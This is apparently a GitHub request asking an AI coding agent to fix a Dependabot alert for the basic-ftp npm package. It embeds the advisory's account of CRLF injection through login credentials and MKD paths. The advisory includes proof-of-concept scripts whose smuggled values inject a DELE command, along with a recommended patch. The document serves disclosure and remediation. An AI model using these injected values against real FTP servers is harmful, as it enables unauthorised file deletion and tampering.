@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix
8. Update the PR title, if needed, to pass CI checks

**Alert Details:**

- **Package:** basic-ftp (npm)
- **Severity:** HIGH
- **Vulnerable versions:** <= 5.2.1
- **Patched version:** 5.2.2
- **CVE:** N/A
- **GHSA:** GHSA-6v7q-wjvx-w8wg
- **Manifest:** pnpm-lock.yaml

**Summary:**
basic-ftp: Incomplete CRLF Injection Protection Allows Arbitrary FTP Command Execution via Credentials and MKD Commands

**Description:**
## Summary

basic-ftp's CRLF injection protection (added in commit 2ecc8e2 for GHSA-chqc-8p9q-pq6q) is incomplete. Two code paths bypass the `protectWhitespace()` control character check: (1) the `login()` method directly concatenates user-supplied credentials into USER/PASS FTP commands without any validation, and (2) the `_openDir()` method sends an MKD command before `cd()` invokes `protectWhitespace()`, creating a TOCTOU bypass. Both vectors allow an attacker who controls input to inject arbitrary FTP commands into the control connection.

## Details

### Vector 1: Credential Injection (login)

The `login()` method constructs FTP commands by direct string concatenation with no CRLF validation:

```typescript
// src/Client.ts:216-231
login(user = "anonymous", password = "guest"): Promise<FTPResponse> {
    this.ftp.log(`Login security: ${describeTLS(this.ftp.socket)}`)
    return this.ftp.handle("USER " + user, (res, task) => {  // Line 218: no validation on `user`
        // ...
        else if (res.code === 331) {
            this.ftp.send("PASS " + password)  // Line 226: no validation on `password`
        }
    })
}
```

`FtpContext.send()` writes directly to the TCP socket:

```typescript
// src/FtpContext.ts:223-227
send(command: string) {
    // ...
    this._socket.write(command + "\r\n", this.encoding)
}
```

The `protectWhitespace()` method (line 762) rejects `\r`, `\n`, and `\0` characters — but it is only called for path-based operations. Credentials never pass through it.

The public `access()` method (line 268) passes `options.user` and `options.password` directly to `login()` with no sanitization.

### Vector 2: MKD TOCTOU Bypass (_openDir)

The `_openDir()` method sends an MKD command before the CRLF check in `cd()`:

```typescript
// src/Client.ts:745-748
protected async _openDir(dirName: string) {
    await this.sendIgnoringError("MKD " + dirName)  // Line 746: sent BEFORE validation
    await this.cd(dirName)                           // Line 747: protectWhitespace() called here — too late
}
```

This is called from `ensureDir()` (line 729) which splits a user-supplied remote path by `/` and passes each fragment to `_openDir()`, and from `_uploadToWorkingDir()` (line 679) which passes local directory names read from the filesystem.

## PoC

### Vector 1: Credential Injection

```javascript
const ftp = require("basic-ftp");

async function exploit() {
    const client = new ftp.Client();
    client.ftp.verbose = true;

    // Connect to target FTP server
    await client.access({
        host: "target-ftp-server",
        port: 21,
        // Username contains CRLF + injected DELE command
        user: "anonymous\r\nDELE important.txt",
        password: "guest"
    });
    // Server receives on the wire:
    //   USER anonymous\r\n
    //   DELE important.txt\r\n
    //   PASS guest\r\n
    // The DELE command executes before PASS is processed

    client.close();
}

exploit();
```

### Vector 2: MKD TOCTOU Bypass

```javascript
const ftp = require("basic-ftp");

async function exploit() {
    const client = new ftp.Client();
    client.ftp.verbose = true;

    await client.access({
        host: "target-ftp-server",
        user: "anonymous",
        password: "guest"
    });

    // Path fragment with CRLF — MKD is sent before cd() validates
    try {
        await client.ensureDir("test\r\nDELE important.txt/subdir");
    } catch (e) {
        // cd() throws after protectWhitespace() rejects, but MKD + DELE already sent
    }
    // Server received:
    //   MKD test\r\n
    //   DELE important.txt\r\n
    //   CWD test\r\n  <-- this may fail, but damage is done

    client.close();
}

exploit();
```

## Impact

An attacker who controls credentials or remote paths passed to basic-ftp can inject arbitrary FTP commands into the control connection. This enables:

- **File deletion**: Inject `DELE` commands to remove files on the FTP server
- **File manipulation**: Inject `RNFR`/`RNTO` to rename files, `MKD`/`RMD` to create/remove directories
- **Server commands**: Inject `SITE` commands (e.g., `SITE CHMOD`) to change permissions
- **Session hijacking**: Inject `USER`/`PASS` to re-authenticate as a different user

The credential injection vector (Vector 1) is particularly dangerous because it occurs before authentication, meaning the injected commands execute with whatever default permissions the server grants during the login handshake.

Applications that accept user-supplied FTP credentials (e.g., web-based file managers, backup tools, deployment systems) are directly vulnerable.

## Recommended Fix

Add CRLF validation to both code paths:

**1. Validate credentials in `login()`:**

```typescript
// src/Client.ts:216
login(user = "anonymous", password = "guest"): Promise<FTPResponse> {
    if (/[\r\n\0]/.test(user) || /[\r\n\0]/.test(password)) {
        return Promise.reject(new Error("Invalid credentials: Contains control characters"));
    }
    this.ftp.log(`Login security: ${describeTLS(this.ftp.socket)}`)
    return this.ftp.handle("USER " + user, (res, task) => {
        // ... rest unchanged
    })
}
```

**2. Validate dirName in `_openDir()` before sending MKD:**

```typescript
// src/Client.ts:745
protected async _openDir(dirName: string) {
    if (/[\r\n\0]/.test(dirName)) {
        throw new Error("Invalid path: Contains control characters");
    }
    await this.sendIgnoringError("MKD " + dirName)
    await this.cd(dirName)
}
```

Alternatively, centralize CRLF validation in `FtpContext.send()` so that all FTP commands are protected regardless of the calling code path.

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/1416)
